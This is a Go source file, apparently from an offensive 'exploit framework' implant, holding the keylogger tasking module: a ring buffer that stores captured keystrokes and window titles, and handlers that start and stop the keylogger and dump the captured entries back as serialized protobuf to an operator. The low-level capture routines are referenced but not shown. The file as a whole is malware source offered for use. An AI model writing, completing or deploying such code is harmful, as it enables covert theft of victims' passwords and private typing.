package tasks

import (
	"context"
	"fmt"
	"sync"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

// KeylogBuffer is a thread-safe ring buffer for keylog entries.
type KeylogBuffer struct {
	mu      sync.Mutex
	entries []*pb.KeylogEntry
	maxSize int
}

var globalKeylogBuffer = &KeylogBuffer{maxSize: 10000}

func (kb *KeylogBuffer) Add(entry *pb.KeylogEntry) {
	kb.mu.Lock()
	defer kb.mu.Unlock()
	if len(kb.entries) >= kb.maxSize {
		// Drop oldest half to make room
		half := kb.maxSize / 2
		copy(kb.entries, kb.entries[half:])
		kb.entries = kb.entries[:len(kb.entries)-half]
	}
	kb.entries = append(kb.entries, entry)
}

func (kb *KeylogBuffer) Dump() []*pb.KeylogEntry {
	kb.mu.Lock()
	defer kb.mu.Unlock()
	entries := make([]*pb.KeylogEntry, len(kb.entries))
	copy(entries, kb.entries)
	kb.entries = kb.entries[:0]
	return entries
}

func executeKeylogStart(_ context.Context, data []byte) ([]byte, error) {
	task := &pb.KeylogStartTask{}
	if len(data) > 0 {
		proto.Unmarshal(data, task)
	}

	if err := startKeylogger(task.CaptureWindowTitles); err != nil {
		return nil, err
	}

	return nil, nil
}

func executeKeylogStop(_ context.Context, _ []byte) ([]byte, error) {
	stopKeylogger()
	return nil, nil
}

func executeKeylogDump(_ context.Context, _ []byte) ([]byte, error) {
	entries := globalKeylogBuffer.Dump()
	if len(entries) == 0 {
		return nil, fmt.Errorf("no keylog entries")
	}
	result := &pb.KeylogDumpResult{Entries: entries}
	return proto.Marshal(result)
}
